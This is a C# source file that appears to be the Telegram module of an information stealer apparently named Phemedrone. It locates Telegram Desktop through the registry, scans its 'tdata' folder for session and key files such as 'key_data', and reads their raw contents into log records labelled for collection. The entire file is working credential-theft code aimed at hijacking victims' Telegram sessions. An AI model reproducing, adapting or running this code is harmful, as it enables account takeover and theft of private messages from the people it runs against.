using System;
using Microsoft.Win32;
using System.IO;
using Phemedrone.Classes;
using System.Collections.Generic;
using System.Linq;
using Phemedrone.Extensions;

namespace Phemedrone.Services
{
    public class Telegram : IService
    {
        public override PriorityLevel Priority => PriorityLevel.Medium;
        
        private readonly List<Func<FileInfo, bool>> _filePatterns = new List<Func<FileInfo, bool>>
        {
            (fInfo) => fInfo.Directory?.Name.Length == 16,
            (fInfo) => fInfo.Directory?.Name == "tdata" && fInfo.Length > 5120,
            (fInfo) => fInfo.Directory?.Name == "tdata" && fInfo.Name.EndsWith("s") && fInfo.Name.Length == 17,
            (fInfo) => fInfo.Directory?.Name == "tdata" && new List<string>
            {
                "usertag", "settings", "key_data", "prefix"
            }.Any(fInfo.Name.StartsWith)
            
        };

        protected override LogRecord[] Collect()
        {
            var array = new List<LogRecord>();
            var path = Registry.GetValue("HKEY_CLASSES_ROOT\\tg\\DefaultIcon", null, "")?
                .ToString();
            if (path == null) return array.ToArray();
            path = new FileInfo(path.Substring(1, path.Length - 2).Split(',')[0]).DirectoryName;
            if (path == null) return array.ToArray();
            path = Path.Combine(path, "tdata");
            if (!Directory.Exists(path)) return array.ToArray();
            foreach (var tDataFile in FileManager.EnumerateFiles(path, "*", 2)
                         .Where(tDataFile => _filePatterns.Select(p => p(new FileInfo(tDataFile)))
                             .Any(x => x)))
            {
                try
                {
                    array.Add(new LogRecord
                    {
                        Path = "Messengers/Telegram/" + tDataFile.Replace(path + "\\", null),
                        Content = File.ReadAllBytes(tDataFile)
                    });
                    ServiceCounter.HasTg = true;
                }
                catch
                {
                    // ignored
                }
            }
            
            ServiceCounter.HasTg = array.Count > 0;
            return array.ToArray();
        }
    }
}